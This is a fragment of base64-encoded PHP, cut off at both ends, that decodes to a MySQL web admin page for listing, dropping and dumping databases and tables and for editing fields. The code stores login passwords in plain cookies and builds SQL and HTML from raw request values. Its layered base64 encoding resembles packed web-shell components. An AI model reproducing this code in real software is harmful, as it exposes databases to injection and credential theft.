90YWJsZT5cbiI7DQoJZWNobyAiPC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+XG4iOw0KCWVjaG8gIjxwPjxociB3aWR0aD0zMDA+XG4iOw0KCWVjaG8gIjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbG9nb25fc3VibWl0KCkgew0KCWdsb2JhbCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGhvc3RuYW1lICwkUEhQX1NFTEY7DQoJaWYoJGhvc3RuYW1lID09JycpDQoJCSRob3N0bmFtZSA9ICdsb2NhbGhvc3QnOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl91c2VybmFtZSIsICR1c2VybmFtZSApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIsICRwYXNzd29yZCApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIsICRob3N0bmFtZSApOw0KCWVjaG8gIjxNRVRBIEhUVFAtRVFVSVY9UmVmcmVzaCBDT05URU5UPScwOyBVUkw9JFBIUF9TRUxGP2FjdGlvbj1iR2x6ZEVSQ2N3PT0nPiI7DQp9DQoNCmZ1bmN0aW9uIGVjaG9RdWVyeVJlc3VsdCgpIHsNCglnbG9iYWwgJHF1ZXJ5U3RyLCAkZXJyTXNnOw0KCWlmKCAkZXJyTXNnID09ICIiICkgJGVyck1zZyA9ICJTdWNjZXNzIjsNCglpZiggJHF1ZXJ5U3RyICE9ICIiICkgew0KCQllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9NT5cbiI7DQoJCWVjaG8gIjx0cj48dGQ+UXVlcnk8L3RkPjx0ZD4kcXVlcnlTdHI8L3RkPjwvdHI+XG4iOw0KCQllY2hvICI8dHI+PHRkPlJlc3VsdDwvdGQ+PHRkPiRlcnJNc2c8L3RkPjwvdHI+XG4iOw0KCQllY2hvICI8L3RhYmxlPjxwPlxuIjsNCgl9DQp9DQoNCmZ1bmN0aW9uIGxpc3REYXRhYmFzZXMoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJFBIUF9TRUxGOw0KCWVjaG8gIjxoMT5EYXRhYmFzZXMgTGlzdDwvaDE+XG4iOw0KCWVjaG8gIjxmb3JtIGFjdGlvbj0nJFBIUF9TRUxGJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWNyZWF0ZURCPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9ZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NyZWF0ZSBEYXRhYmFzZSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPGhyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz01PlxuIjsNCgkkcERCID0gbXlzcWxfbGlzdF9kYnMoICRteXNxbEhhbmRsZSApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBEQiApOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRkYm5hbWUgPSBteXNxbF9kYm5hbWUoICRwREIsICRpICk7DQoJCWVjaG8gIjx0cj5cbiI7DQoJCWVjaG8gIjx0ZD4kZGJuYW1lPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWxpc3RUYWJsZXMmZGJuYW1lPSRkYm5hbWUnPlRhYmxlczwvYT48L3RkPlxuIjsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcERCJmRibmFtZT0kZGJuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgRGF0YWJhc2UgXCckZGJuYW1lXCc/JylcIj5Ecm9wPC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kdW1wREImZGJuYW1lPSRkYm5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHVtcCBEYXRhYmFzZSBcJyRkYm5hbWVcJz8nKVwiPkR1bXA8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gY3JlYXRlRGF0YWJhc2UoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCW15c3FsX2NyZWF0ZV9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbGlzdERhdGFiYXNlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRGF0YWJhc2UoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCW15c3FsX2Ryb3BfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCWxpc3REYXRhYmFzZXMoKTsNCn0NCg0KZnVuY3Rpb24gbGlzdFRhYmxlcygpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkUEhQX1NFTEY7DQoJZWNobyAiPGgxPlRhYmxlcyBMaXN0PC9oMT5cbiI7DQoJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9Y3JlYXRlVGFibGU+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9dGFibGVuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NyZWF0ZSBUYWJsZSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9cXVlcnk+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IHNpemU9MTIwIG5hbWU9cXVlcnlTdHI+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUXVlcnknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBUYWJsZSA9IG15c3FsX2xpc3RfdGFibGVzKCAkZGJuYW1lICk7DQoJaWYoICRwVGFibGUgPT0gMCApIHsNCgkJJG1zZyAgPSBteXNxbF9lcnJvcigpOw0KCQllY2hvICI8aDM+RXJyb3IgOiAkbXNnPC9oMz48cD5cbiI7DQoJCXJldHVybjsNCgl9DQoJJG51bSA9IG15c3FsX251bV9yb3dzKCAkcFRhYmxlICk7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJHRhYmxlbmFtZSA9IG15c3FsX3RhYmxlbmFtZSggJHBUYWJsZSwgJGkgKTsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiJHRhYmxlbmFtZVxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5EYXRhPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5Ecm9wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHVtcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0R1bXAgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5EdW1wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPiI7DQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZVRhYmxlKCkgew0KDQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkNSRUFURSBUQUJMRSAkdGFibGVuYW1lICggbm8gSU5UICkiOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbXlzcWxfcXVlcnkoICRxdWVyeVN0ciwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJbGlzdFRhYmxlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wVGFibGUoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkRST1AgVEFCTEUgJHRhYmxlbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCglsaXN0VGFibGVzKCk7DQp9DQoNCmZ1bmN0aW9uIHZpZXdTY2hlbWEoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJZWNobyAiPGgxPlRhYmxlIFNjaGVtYTwvaDE+XG4iOw0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvUXVlcnlSZXN1bHQoKTsNCgllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWFkZEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRmllbGQ8L2E+IHwgXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5WaWV3IERhdGE8L2E+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgIlNIT1cgZmllbGRzIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+RmllbGQ8L3RoPlxuIjsNCgllY2hvICI8dGg+VHlwZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5OdWxsPC90aD5cbiI7DQoJZWNobyAiPHRoPktleTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5EZWZhdWx0PC90aD5cbiI7DQoJZWNobyAiPHRoPkV4dHJhPC90aD5cbiI7DQoJZWNobyAiPHRoIGNvbHNwYW49Mj5BY3Rpb248L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCg0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2FycmF5KCAkcFJlc3VsdCApOw0KCQllY2hvICI8dHI+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIkZpZWxkIl0uIjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIlR5cGUiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiTnVsbCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJLZXkiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiRGVmYXVsdCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJFeHRyYSJdLiI8L3RkPlxuIjsNCgkJJGZpZWxkbmFtZSA9ICRmaWVsZFsiRmllbGQiXTsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZWRpdEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJmZpZWxkbmFtZT0kZmllbGRuYW1lJz5FZGl0PC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kcm9wRmllbGQmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmZmllbGRuYW1lPSRmaWVsZG5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHJvcCBGaWVsZCBcJyRmaWVsZG5hbWVcJz8nKVwiPkRyb3A8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbWFuYWdlRmllbGQoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBGaWVsZDwvaDE+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aDE+RWRpdCBGaWVsZDwvaDE+XG4iOw0KCQkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCQkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCQkkZmllbGQgPSBteXNxbF9mZXRjaF9hcnJheSggJHBSZXN1bHQgKTsNCgkJCWlmKCAkZmllbGRbIkZpZWxkIl0gPT0gJGZpZWxkbmFtZSApIHsNCgkJCQkkZmllbGR0eXBlID0gJGZpZWxkWyJUeXBlIl07DQoJCQkJJGZpZWxka2V5ID0gJGZpZWxkWyJLZXkiXTsNCgkJCQkkZmllbGRleHRyYSA9ICRmaWVsZFsiRXh0cmEiXTsNCgkJCQkkZmllbGRudWxsID0gJGZpZWxkWyJOdWxsIl07DQoJCQkJJGZpZWxkZGVmYXVsdCA9ICRmaWVsZFsiRGVmYXVsdCJdOw0KCQkJCWJyZWFrOw0KCQkJfQ0KCQl9DQoNCgkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCWlmKCBzdHJwb3MoICRmaWVsZHR5cGUsICIoIiApICkgew0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCSR2YWx1ZWxpc3QgPSBzdHJ0b2soICIgKClcbiIgKTsNCgkJCX0gZWxzZSB7DQoJCQkJJE0gPSBzdHJ0b2soICIgKCwpXG4iICk7DQoJCQkJaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgIiwiICkgKQ0KCQkJCQkkRCA9IHN0cnRvayggIiAoLClcbiIgKTsNCgkJCX0NCgkJfQ0KCX0NCg0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JFBIUF9TRUxGPlxuIjsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1hZGRGaWVsZF9zdWJtaXQ+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9ZWRpdEZpZWxkX3N1Ym1pdD5cbiI7DQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPW9sZF9uYW1lIHZhbHVlPSRmaWVsZG5hbWU+XG4iOw0KCX0NCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kYm5hbWUgdmFsdWU9JGRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9dGFibGVuYW1lIHZhbHVlPSR0YWJsZW5hbWU+XG4iOw0KCWVjaG8gIjxoMz5OYW1lPC9oMz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPW5hbWUgdmFsdWU9JGZpZWxkbmFtZT48cD5cbiI7DQoJZWNobyAnDQoNCjxoMz5UeXBlPC9oMz4NCjxmb250IHNpemU9MiBjbGFzcz0ibmV3Ij4NCiogYE1cJyBpbmRpY2F0ZXMgdGhlIG1heGltdW0gZGlzcGxheSBzaXplLjxicj4NCiogYERcJyBhcHBsaWVzIHRvIGZsb2F0aW5nLXBvaW50IHR5cGVzIGFuZCBpbmRpY2F0ZXMgdGhlIG51bWJlciBvZiBkaWdpdHMgZm9sbG93aW5nIHRoZSBkZWNpbWFsIHBvaW50Ljxicj4NCjwvZm9udD4NCjx0YWJsZT4NCjx0cj4NCjx0aD5UeXBlPC90aD48dGg+Jm5ic3BNJm5ic3A8L3RoPjx0aD4mbmJzcEQmbmJzcDwvdGg+PHRoPnVuc2lnbmVkPC90aD48dGg+emVyb2ZpbGw8L3RoPjx0aD5iaW5hcnk8L3RoPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllJTlQiICc7IGlmKCAkdHlwZSA9PSAidGlueWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElOWUlOVCAoLTEyOCB+IDEyNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iU01BTExJTlQiICc7IGlmKCAkdHlwZSA9PSAic21hbGxpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNNQUxMSU5UICgtMzI3NjggfiAzMjc2Nyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNSU5UIiAnOyBpZiggJHR5cGUgPT0gIm1lZGl1bWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNSU5UICgtODM4ODYwOCB+IDgzODg2MDcpPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IklOVCIgJzsgaWYoICR0eXBlID09ICJpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPklOVCAoLTIxNDc0ODM2NDggfiAyMTQ3NDgzNjQ3KTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJCSUdJTlQiICc7IGlmKCAkdHlwZSA9PSAiYmlnaW50IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CSUdJTlQgKC05MjIzMzcyMDM2ODU0Nzc1ODA4IH4gOTIyMzM3MjAzNjg1NDc3NTgwNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iRkxPQVQiICc7IGlmKCAkdHlwZSA9PSAiZmxvYXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkZMT0FUPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkRPVUJMRSIgJzsgaWYoICR0eXBlID09ICJkb3VibGUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRPVUJMRTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJERUNJTUFMIiAnOyBpZiggJHR5cGUgPT0gImRlY2ltYWwiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRFQ0lNQUwoTlVNRVJJQyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURSIgJzsgaWYoICR0eXBlID09ICJkYXRlIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5EQVRFICgxMDAwLTAxLTAxIH4gOTk5OS0xMi0zMSwgWVlZWS1NTS1ERCk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURVRJTUUiICc7IGlmKCAkdHlwZSA9PSAiZGF0ZXRpbWUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRBVEVUSU1FICgxMDAwLTAxLTAxIDAwOjAwOjAwIH4gOTk5OS0xMi0zMSAyMzo1OTo1OSwgWVlZWS1NTS1ERCBISDpNTTpTUyk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElNRVNUQU1QIiAnOyBpZiggJHR5cGUgPT0gInRpbWVzdGFtcCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRVNUQU1QICgxOTcwLTAxLTAxIDAwOjAwOjAwIH4gMjEwNi4uLiwgWVlZWU1NRERbSEhbTU1bU1NdXV0pPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTUUiICc7IGlmKCAkdHlwZSA9PSAidGltZSIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRSAoLTgzODo1OTo1OSB+IDgzODo1OTo1OSwgSEg6TU06U1MpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IllFQVIiICc7IGlmKCAkdHlwZSA9PSAieWVhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+WUVBUiAoMTkwMSB+IDIxNTUsIDAwMDAsIFlZWVkpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkNIQVIiICc7IGlmKCAkdHlwZSA9PSAiY2hhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+Q0hBUjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJWQVJDSEFSIiAnOyBpZiggJHR5cGUgPT0gInZhcmNoYXIiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlZBUkNIQVI8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElOWVRFWFQiICc7IGlmKC